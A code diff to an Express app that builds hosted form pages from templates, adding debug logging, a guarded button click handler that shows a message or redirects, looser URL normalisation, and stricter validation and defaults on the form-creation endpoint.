@@ -298,6 +298,11 @@ const formTemplate = `
     const messageText = document.getElementById('message-text');
 
     console.log('Live Form State:', state);
+    console.log('Button Properties:', {
+      action: state.buttonAction,
+      url: state.buttonUrl,
+      message: state.buttonMessage
+    });
 
     function normalizeUrl(url) {
       if (!url) {
@@ -308,9 +313,9 @@ const formTemplate = `
         console.log('URL already has protocol:', url);
         return url;
       }
-      if (url.match(/\.[a-z]{2,}$/i)) {
+      if (url.match(/\.[a-z]{2,}$/i) || url.match(/^[a-zA-Z0-9-]+\.[a-z]{2,}$/)) {
         console.log('Adding https:// to URL:', url);
-        return "https://" + url;
+        return 'https://' + url;
       }
       console.log('Invalid URL:', url);
       return null;
@@ -318,7 +323,7 @@ const formTemplate = `
 
     function showMessagePopup(message) {
       console.log('Showing popup with message:', message);
-      messageText.textContent = message || 'Welcome! You have clicked the button.';
+      messageText.textContent = message || 'Default message';
       messagePopup.classList.add('show');
       messageOverlay.classList.add('show');
     }
@@ -330,6 +335,7 @@ const formTemplate = `
     }
 
     function checkFormFilled() {
+      console.log('Checking form fields');
       const inputs = inputFieldsContainer.querySelectorAll('input');
       const templateFields = templates[state.template]?.fields || [];
 
@@ -339,6 +345,7 @@ const formTemplate = `
         const fieldId = input.id.replace('login-', '');
         const templateField = templateFields.find(field => field.id === fieldId);
 
+        console.log('Field:', fieldId, 'Value:', value);
         if (!value) {
           showMessagePopup('Please fill all fields before proceeding.');
           return false;
@@ -352,28 +359,37 @@ const formTemplate = `
       return true;
     }
 
-    loginButton.addEventListener('click', () => {
-      console.log('Button clicked, action:', state.buttonAction, 'URL:', state.buttonUrl, 'Message:', state.buttonMessage);
-      if (!checkFormFilled()) {
-        console.log('Form validation failed');
-        return;
-      }
-      const action = state.buttonAction || 'message';
-      if (action === 'url') {
-        const normalizedUrl = normalizeUrl(state.buttonUrl);
-        if (normalizedUrl) {
-          console.log('Redirecting to:', normalizedUrl);
-          window.location.href = normalizedUrl;
-        } else {
-          showMessagePopup('Please enter a valid URL (e.g., www.example.com).');
+    if (loginButton) {
+      loginButton.addEventListener('click', () => {
+        console.log('Button clicked');
+        console.log('Button action:', state.buttonAction || 'message');
+        console.log('Button URL:', state.buttonUrl || 'none');
+        console.log('Button message:', state.buttonMessage || 'none');
+
+        if (!checkFormFilled()) {
+          console.log('Form validation failed');
+          return;
         }
-      } else if (action === 'message') {
-        showMessagePopup(state.buttonMessage || 'Default message');
-      } else {
-        console.log('Invalid button action:', action);
-        showMessagePopup('Invalid button action configured.');
-      }
-    });
+
+        const action = state.buttonAction || 'message';
+        if (action === 'url' && state.buttonUrl) {
+          const normalizedUrl = normalizeUrl(state.buttonUrl);
+          if (normalizedUrl) {
+            console.log('Redirecting to:', normalizedUrl);
+            window.location.href = normalizedUrl;
+          } else {
+            showMessagePopup('Please enter a valid URL (e.g., www.example.com).');
+          }
+        } else if (action === 'message') {
+          showMessagePopup(state.buttonMessage || 'Default message');
+        } else {
+          console.log('Invalid or missing button action:', action);
+          showMessagePopup('Button action not configured correctly.');
+        }
+      });
+    } else {
+      console.error('Login button not found in DOM');
+    }
 
     messagePopupClose.addEventListener('click', hideMessagePopup);
     messageOverlay.addEventListener('click', hideMessagePopup);
@@ -385,12 +401,17 @@ const formTemplate = `
 app.post('/create', (req, res) => {
   const state = req.body;
   console.log('Received state:', state);
-  if (!state || !state.template || !state.placeholders) {
+  if (!state || !state.template || !state.placeholders || !state.buttonAction) {
     console.error('Invalid state received:', state);
     return res.status(400).send('Invalid form state');
   }
   const id = idCounter++;
-  forms[id] = state;
+  forms[id] = {
+    ...state,
+    buttonAction: state.buttonAction || 'message',
+    buttonUrl: state.buttonUrl || '',
+    buttonMessage: state.buttonMessage || 'Default message'
+  };
   const url = `https://${process.env.RENDER_EXTERNAL_HOSTNAME || `localhost:${port}`}/form/${id}`;
   console.log('Generated URL:', url);
   res.json({ url });
